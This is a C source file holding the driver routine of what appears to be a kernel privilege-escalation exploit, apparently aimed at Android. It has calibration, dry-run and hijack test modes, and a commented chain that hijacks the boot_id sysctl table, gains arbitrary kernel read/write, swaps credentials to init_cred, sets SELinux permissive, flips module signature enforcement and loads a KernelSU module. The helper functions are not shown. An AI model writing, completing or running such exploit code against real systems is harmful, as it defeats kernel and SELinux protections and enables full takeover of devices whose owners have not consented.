#include "common.h"
#include "env_defaults.h"

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  bake_env_defaults();  // compile-time env defaults, baked into every build (env vars still override)
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();

  pin_to_core(CORE);
  if (getenv("STAMP_ONLY")) {
    setenv("W_TARGET_DM_B00", "1", 1);
    setenv("W_VALUE_DM_200", "1", 1);
    sysctl_w_armed = 1;
    uintptr_t base = prepare_dm_page(PAGE_PAYLOAD_SLIDE);
    unsetenv("W_TARGET_DM_B00");
    unsetenv("W_VALUE_DM_200");
    if (!base) return 1;
    slide_debug_stamp();
    return 0;
  }
  if (getenv("BSS_TEST")) {
    return run_bss_test() ? 0 : 1;
  }
  if (getenv("SELINUX_TEST")) {
    return run_selinux_test() ? 0 : 1;
  }
  if (getenv("UUID_HIJACK")) {
    return run_uuid_hijack() ? 0 : 1;
  }
  if (getenv("HIJACK_ONLY")) {
    return run_hijack_only() ? 0 : 1;
  }
  if (getenv("CALIBRATE_PAGE")) {
    return run_calibrate_page() ? 0 : 1;
  }
  if (getenv("CALIBRATE")) {
    return run_calibrate() ? 0 : 1;
  }
  if (getenv("DRYRUN")) {
    sysctl_w_armed = 1;
    sysctl_w_target = p0_data_alias(KIMAGE_TEXT_BASE + CTL_BOOTID_DATA_OFF);
    sysctl_w_value = p0_data_alias(KIMAGE_TEXT_BASE + INIT_TASK_OFF + TASK_COMM_OFF);
    uintptr_t base = prepare_dm_page(PAGE_PAYLOAD_SLIDE);
    pr_success("DRYRUN ctl=%016zx comm=%016zx dm=%016zx wval=%016zx "
               "wtgt=%016zx\n", (size_t)sysctl_w_target, (size_t)sysctl_w_value,
               (size_t)base, (size_t)sysctl_w_value, (size_t)sysctl_w_target);
    return base ? 0 : 1;
  }
  // sysctl route: boot_id ctl_table hijack -> arbitrary R/W via direct-map
  // alias -> cred swap to init_cred -> SELinux permissive + sig_enforce flip
  // -> KSU module load.
  if (!run_sysctl_stage()) {
    pr_error("sysctl stage failed\n");
    return 1;
  }

  pr_success("exploit chain complete pid=%d\n", getpid());
  return 0;
}
